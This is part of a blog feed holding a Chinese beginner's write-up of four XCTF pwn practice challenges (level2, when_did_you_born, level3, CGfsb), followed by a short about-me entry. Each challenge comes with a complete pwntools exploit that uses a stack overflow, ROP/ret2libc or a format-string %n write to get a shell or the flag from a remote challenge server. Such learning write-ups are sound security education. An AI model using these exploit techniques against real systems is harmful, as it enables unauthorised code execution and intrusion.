    <content type="html"><![CDATA[<p>这是从原来的博客搬过来的，之前刚开始接触pwn学的，现在已经转战web，留作纪念。一下题目均来自攻防世界pwn新手区</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2:"></a><strong>level2</strong>:</h2><p>连接题目，发现一个输入口</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-9.png" class><p>检查保护措施</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-10.png" class><p>打开ida,观察主函数，主函数很简单，调用vulnerable_function后输出Hello，World</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-11.png" class><p>进入函数vulnerable_function，buf最大字节长度0x88，比0x100小，存在溢出</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-12.png" class><p>观察函数列表，没有发现可以执行shellcode的函数</p><p>根据题目信息，需要用到ROP，猜测需要构建函数栈帧。缺少变量，shift+F12查看一下字符串，发现了我们需要的东西</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-13.png" class><p>思路：将buf溢出，覆盖read函数的返回地址为_system函数。然后用/bin/sh构建一个栈帧，执行shellcode</p><p>_system = 0x08048320</p><p>shell = 0x0804A024</p><p>payload：’a’*0x88 + p32(1) + p32(_system) + p32(1) + p32(shell) + P32(1)</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">res &#x3D; remote(&#39;220.249.52.133&#39;,37278)</span><br><span class="line">_system &#x3D; 0x08048320</span><br><span class="line">shellcode &#x3D; 0x0804A024</span><br><span class="line">payload &#x3D; &#39;A&#39;*0x88 + p32(1) + p32(_system) + p32(1) + p32(shellcode)</span><br><span class="line">res.sendline(payload)</span><br><span class="line">res.interactive()</span><br></pre></td></tr></table></figure><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-15.png" class><h2 id="when-did-you-born："><a href="#when-did-you-born：" class="headerlink" title="when_did_you_born："></a>when_did_you_born：</h2><p>链接题目，输入口有2个，分别输入出生日期和姓名</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-16.png" class><p>查看防御措施，存在Canary，无法构造栈帧</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-17.png" class><p>进入ida查看主函数，发现意图明显。第一次输入的Birth不能为1926，当变量V5为1926的时候输出flag。那么推测第二次输入姓名存在溢出，将V5变量覆盖为1926，输出flag</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-18.png" class><p>验证猜想正确var_20对应V4变量，var18对应V5变量</p><p><img src="/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C%5C%E6%8D%95%E8%8E%B7-19.png"></p><p>构造payload：’A’*8 + p32(1926)</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">res &#x3D; remote(&#39;220.249.52.133&#39;,42242)</span><br><span class="line">payload &#x3D; &#39;A&#39;*8 + p32(1926)</span><br><span class="line">res.recvuntil(&#39;Birth&#39;)</span><br><span class="line">res.sendline(&#39;123&#39;)</span><br><span class="line">res.recvuntil(&#39;Name&#39;)</span><br><span class="line">res.sendline(payload)</span><br><span class="line">res.interactive()</span><br></pre></td></tr></table></figure><p>get flag！</p><h2 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h2><p>链接题目，看一下大致内容</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-20.png" class><p>将level3用ida打开查看，进入主函数，内容非常简单</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-21.png" class><p>进而进入vulnerable_function查看，发现read函数存在溢出点</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-22.png" class><p>观察函数列表，未发现system函数，打开字符串查找未发现/bin/sh字样字符串。题目压缩包附带了一个libc文件，考虑到本题用到ret2libc分析。从libc中载入system函数和/bin/sh字符串，从而达到获取权限目的。</p><p>使用ida打开附件libc_32.so.6</p><p>搜索到system函数，函数地址为0x3A940</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-23.png" class><p>通过命令 strings -a -t x libc | grep “/bin/sh” 查找到/bin/sh在libc中的偏移为15902b</p><p>现在我们只需要知道libc的地址，从而计算出system和/bin/sh的地址即可，要想得到libc地址，则需要通过得到write函数的真实地址，用write函数的真实地址减去write函数在libc中的地址便可得到libc的地址。</p><p>如何得到write函数的真实地址？用ida打开level3我们发现，write函数的地址属于plt部分，这个并不是write函数的真实地址</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-25.png" class><p>而我们知道，动态链接库加载函数的时候，如果是第一次加载这个函数，便会通过plt表中对应位置的代码调用连接器来解析write函数在外部的地址，并且将这个真实地址(write函数的)返回填写到write_got.plt中。而我们需要做的就是通过溢出，首先执行plt中对应的关于write函数的代码，这个时候就会调用连接器查找write函数，并且把write函数真实地址已经存放进了got.plt这个表对应write函数的位置中了。当这个过程结束后，我们再次返回到vulnerable_function这个函数中，再次调用write函数，将参数传入write函数使他输出write函数的真实地址（在got.plt表中对应的位置）这样便获得了write函数的真实地址。</p><p>通过ida查找，可以发现:</p><p>write_plt = 0x08048340 write函数plt地址<br>write_got.plt = 0x0804A018 write函数got.plt地址<br>vulnerable_function = 0x0804844B write函数父函数地址</p><p>第一次溢出payload：<br>payload = ‘A’*0x88 + p32(1) + p32(write_plt) + p32( vulnerable_function) + p32(1) + p32(write_got.plt) + p32(0x4)</p><p>‘A’*0X88：填充字符串buf</p><p>P32(1)：劫持EIP</p><p>P32(write_plt)：函数返回到此处调用连接器，将write函数真实地址覆盖到got.plt表中</p><p>p32( vulnerable_function)：函数返回write函数父函数</p><p>p32(1) 传入参数1</p><p>p32(write_got.plt)传入参数2</p><p>p32(0x4)传入参数3</p><p>接下来获取write函数的真实地址</p><p>write_got_addr = u32(sh.recv())</p><p>计算出libc地址：libc_addr = write_got_addr – libc.symbols[‘write’]</p><p>计算出system真实地址：sys_addr = libc_addr + libc.symbols[‘system’]</p><p>计算bin字符串真实地址：bin_sh_addr = libc_addr + 0x15902b</p><p>第二次payload：payload2 = ‘A’*0x88 + p32(1) + p32(sys_addr) + p32(1) + p32(bin_sh_addr) 简单的溢出，劫持eip，覆盖返回地址，返回地址，传参</p><p>完整exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">sh &#x3D; remote(&#39;220.249.52.133&#39;,49400)</span><br><span class="line">libc&#x3D;ELF(&#39;libc&#39;)</span><br><span class="line"> </span><br><span class="line">#get func address</span><br><span class="line">write_plt &#x3D; 0x08048340</span><br><span class="line">write_got_plt &#x3D; 0x0804A018</span><br><span class="line">vulnerable_function &#x3D; 0x0804844B</span><br><span class="line">payload &#x3D; &#39;A&#39;*0x88 + p32(1) + p32(write_plt) + p32( vulnerable_function) + p32(1) + p32(write_got_plt) + p32(0x4)</span><br><span class="line"> </span><br><span class="line">sh.sendlineafter(&quot;Input:\n&quot;,payload)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">write_got_addr &#x3D; u32(sh.recv())</span><br><span class="line"></span><br><span class="line">libc_addr &#x3D; write_got_addr - libc.symbols[&#39;write&#39;]</span><br><span class="line"></span><br><span class="line">sys_addr &#x3D; libc_addr + libc.symbols[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">bin_sh_addr &#x3D; libc_addr + 0x15902b</span><br><span class="line"></span><br><span class="line">payload2 &#x3D; &#39;A&#39;*0x88 + p32(1) + p32(sys_addr) + p32(1) + p32(bin_sh_addr)</span><br><span class="line"> </span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-26.png" class><p>本题感谢N0p3的大力支持！！！！</p><h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>老规矩，连接题目，实现类似于留言板的小程序</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-27.png" class><p>查看保护措施存在栈溢出保护，DEP保护</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-28.png" class><p>ida查看，可以发现，将pwnme变量赋值为8即可获得flag。pwnme上面的一行代码引起了我们的主意。程序直接将printf函数的参数控制权限交给了我们，也就是说这里存在格式化字符串漏洞。我们需要利用这一漏洞将pwnme变为8</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/image.png" class><p>想要修改pwnme的值首先就要知道pwnme的地址以及他在栈中的偏移，简单的测试一下。我通过print函数输入了字符串“bbbb-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x”它有什么用？首先，根据printf函数的特性，bbbb被入栈用于输出，而后面的%x由于没有对应的数据输出，那么将会输出栈中每个字节的数据。我们根据输出结果不难发现，首先输出的是bbbb，这是正常printf函数该做的事情，然后连续输出栈中数据，直到我们发现了62626262，这是我们输出的数据bbbb的十六进制。那么数一下就不难发现，我们向printf函数中输入的字符串是存储在栈中第10个字节处，那么我们就可以将pwnme变量的地址保存在第十个字节处，在利用%n写入数据8达到修改pwnme数据的目的。</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-29.png" class><p>ida查找到pwnme变量的地址为0x0804A068</p><p>pwnme_addr = 0x0804A068</p><p>payload：p32(pwnme_addr) + ‘a’*4 + ‘%10$n’</p><p>p32(pwnme_addr)首先保存在栈中偏移10个字节的地方，然后用4个a补充4个字节，那么p32(pwnme_addr) + a*4便拥有8个字节 %10$n的意思就是将他前面字符串的字节个数赋值到第10位的地方也就是pwnme地址所在的位置。那么这样pwnme便完成了数字8的赋值。</p><p>完整exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">res &#x3D; remote(&#39;220.249.52.133&#39;,42809)</span><br><span class="line">pwnme_addr &#x3D; 0x0804A068</span><br><span class="line">res.recvuntil(&#39;name&#39;)</span><br><span class="line">res.sendline(&#39;XJJ&#39;)</span><br><span class="line">payload &#x3D; p32(pwnme_addr) + &#39;a&#39;*4 + &#39;%10$n&#39;</span><br><span class="line">res.recvuntil(&#39;message&#39;)</span><br><span class="line">res.sendline(payload)</span><br><span class="line">res.interactive()</span><br></pre></td></tr></table></figure><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/image-1.png" class><p>get flag！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这是从原来的博客搬过来的，之前刚开始接触pwn学的，现在已经转战web，留作纪念。一下题目均来自攻防世界pwn新手区&lt;/p&gt;
&lt;h2 id=&quot;level2&quot;&gt;&lt;a href=&quot;#level2&quot; class=&quot;headerlink&quot; title=&quot;level2:&quot;&gt;&lt;/a&gt;&lt;</summary>
      
    
    
    
    
    <category term="pwn入门" scheme="http://example.com/tags/pwn%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>aboutme</title>
    <link href="http://example.com/2020/12/15/aboutme/"/>
    <id>http://example.com/2020/12/15/aboutme/</id>
    <published>2020-12-15T09:32:14.000Z</published>
    <updated>2021-02-04T15:02:50.851Z</updated>
    
    <content type="html"><![CDATA[<p>一名菜鸡ctfer，web🐕，努力学习中……</p><p>原来的博客太卡了，现在重新搭建博客。之前的文章搬了一部分留作纪念，在这里重新开始写文章。</p><img src="/2020/12/15/aboutme/image-20210128171024124.png" class><p>联系方式：</p><p>微信：</p><p><a href="https://imgchr.com/i/rMJaa8"><img src="https://s3.ax1x.com/2020/12/15/rMJaa8.png" alt="rMJaa8.png"></a></p><p>QQ：</p><p><a href="https://imgchr.com/i/rMJUVf"><img src="https://s3.ax1x.com/2020/12/15/rMJUVf.png" alt="rMJUVf.png"></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一名菜鸡ctfer，web🐕，努力学习中……&lt;/p&gt;
&lt;p&gt;原来的博客太卡了，现在重新搭建博客。之前的文章搬了一部分留作纪念，在这里重新开始写文章。&lt;/p&gt;
&lt;img src=&quot;/2020/12/15/aboutme/image-20210128171024124.png</summary>
      
    
    
    
    
  </entry>
  
</feed>
